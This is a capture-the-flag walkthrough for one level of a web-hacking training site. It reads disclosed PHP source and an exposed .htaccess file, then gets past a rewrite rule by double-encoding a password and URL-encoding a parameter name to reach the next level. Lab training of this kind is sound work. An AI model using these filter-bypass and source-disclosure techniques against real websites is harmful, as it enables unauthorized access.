# Level-28

Level28-29

Send this request:

```text
https://matrix.voorivex.academy/the-final-fight-b1f6bb930427fc161f4fbb8ccdf06eca/?show-me-the-codes
```

you will get a php code:

```php
<?php
if (isset($_GET['show-me-the-codes'])) {
    show_source("index.php");
    exit();
}

if (isset($_GET["show-me-more"])) {
    print_r(scandir("."));
    die();
}

if (isset($_GET['u']) && isset($_GET['p'])) {
    if ($_GET['u'] == 'Neo' && $_GET['p'] == 'Sup3r&H3ro'){
        require_once('next.php');
        die($next);
    }
}

?>
```

according to code, send this request:

```text
https://matrix.voorivex.academy/the-final-fight-b1f6bb930427fc161f4fbb8ccdf06eca/?show-me-more
```

you will get this:

```text
Array
(
    [0] => .
    [1] => ..
    [2] => .htaccess
    [3] => 1.png
    [4] => 2.png
    [5] => 3.png
    [6] => images
    [7] => index.php
    [8] => next.php
)
```

you can access the `.htaccess`, send this request:

```text
https://matrix.voorivex.academy/the-final-fight-b1f6bb930427fc161f4fbb8ccdf06eca/.htaccess
```

you will get this config:


```text
<IfModule mod_rewrite.c>
    RewriteEngine On

    RewriteRule ^([^/]+)/([^/]+)$ /the-final-fight-b1f6bb930427fc161f4fbb8ccdf06eca/index.php?u=$1&p=$2 [QSA,L]

    RewriteCond %{THE_REQUEST} u=([^&]+) [NC]
    RewriteRule ^ / [R=403,L]
</IfModule>
```

according to config one solution is to double encode the `Sup3r&H3ro` to reach to php code:

```text
https://matrix.voorivex.academy/the-final-fight-b1f6bb930427fc161f4fbb8ccdf06eca/Neo/Sup3r%2526H3ro
```

you will get this:

```text
/the-final-fight-05f94763492df091df93a019de59fbb0
```

another solution is to url encode the `u` parameter:

```text
https://matrix.voorivex.academy/the-final-fight-b1f6bb930427fc161f4fbb8ccdf06eca/?%75=Neo&p=Sup3r%26H3ro

/the-final-fight-05f94763492df091df93a019de59fbb0
```

go to:

```text
https://matrix.voorivex.academy/the-final-fight-05f94763492df091df93a019de59fbb0
```







